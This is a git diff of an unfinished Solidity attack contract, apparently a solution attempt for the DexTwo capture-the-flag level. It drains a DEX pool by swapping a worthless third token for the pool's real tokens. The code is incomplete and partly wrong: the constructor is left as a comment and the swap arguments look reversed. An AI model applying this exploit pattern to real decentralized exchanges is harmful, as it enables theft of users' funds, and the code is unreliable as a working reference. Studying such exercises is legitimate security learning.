@@ -14,11 +14,12 @@ import "@openzeppelin/contracts/access/Ownable.sol";
     2. so we need to use the native DexTwo swap() function
     3. we can mimic the other functions - getSwapPrice() and approve() from here
     4. from, to, amount, spender --> these vars required
-
 */
 
 contract Attack23 {
     DexTwo public target;
+    address public token1;
+    address public token2;
     address public token3;
     address public owner;
     uint256 public token3Player;
@@ -27,8 +28,7 @@ contract Attack23 {
     constructor(address _target, uint256 amountPool, uint256 amountPlayer) {
         owner = msg.sender;
         target = DexTwo(_target);
-        token3Pool = amountPool;     // 0 
-        token3Player = amountPlayer; // 200
+        // set amount of token 3 to 200  <-- here 
     }
 
 
@@ -36,24 +36,20 @@ contract Attack23 {
     // function approve(address spender, uint amount) public
 
 
-    function attack() public {
-        // check GOHEESHENG
-  
-        // swap 100 token3 --> 100 token1
-        // swap 100 token3 --> 100 token2
-
-        // target.swap(from, to, amount);
+    function attack(address _from1, address _from2, uint256 _amount) public {
+        target.swap(_from1, token3, _amount);
+        target.swap(_from2, token3, _amount);
     }
 
     receive() external payable {}
 
-    modifier onlyOwner() {
-        require (msg.sender == owner, "Only the owner can withdraw");
-        _;
-    }
+    // modifier onlyOwner() {
+    //     require (msg.sender == owner, "Only the owner can withdraw");
+    //     _;
+    // }
 
-    function withdraw() onlyOwner public {
-         msg.sender.transfer(address(this).balance);
-     }
+    // function withdraw() onlyOwner public {
+    //      msg.sender.transfer(address(this).balance);
+    //  }
 }
 
